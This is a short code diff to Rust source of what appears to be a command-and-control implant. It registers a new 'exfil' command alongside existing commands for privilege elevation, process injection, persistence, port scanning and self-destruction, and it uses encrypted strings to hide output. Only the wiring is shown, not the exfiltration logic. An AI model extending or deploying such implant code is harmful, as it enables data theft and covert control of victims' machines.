@@ -26,6 +26,7 @@ mod whoami;
 mod unknown;
 mod selfdestruct;
 mod sysinfo;
+mod exfil;
 
 /// Uses litcrypt to encrypt output strings
 /// and create `Ok(String)` output
@@ -51,6 +52,7 @@ pub enum CommandType {
     Config,
     Download,
     Elevate,
+    Exfil,
     Getprivs,
     Inject,
     Portscan,
@@ -173,6 +175,7 @@ impl NotionCommand {
                 "config"   => CommandType::Config,
                 "download" => CommandType::Download,
                 "elevate"  => CommandType::Elevate,
+                "exfil"    => CommandType::Exfil,
                 "getprivs" => CommandType::Getprivs,
                 "inject"   => CommandType::Inject,
                 "persist"  => CommandType::Persist,
@@ -201,6 +204,7 @@ impl NotionCommand {
             CommandType::Config    => config::handle(&mut self.args, config_options, logger).await,
             CommandType::Download => download::handle( &mut self.args, logger).await,
             CommandType::Elevate  => elevate::handle(&mut self.args, config_options).await,
+            CommandType::Exfil   => exfil::handle(&mut self.args, config_options, logger).await,
             CommandType::Getprivs    => getprivs::handle().await,
             CommandType::Inject   => inject::handle(&mut self.args, logger).await,
             CommandType::Persist  => persist::handle(&mut self.args, config_options, logger).await,
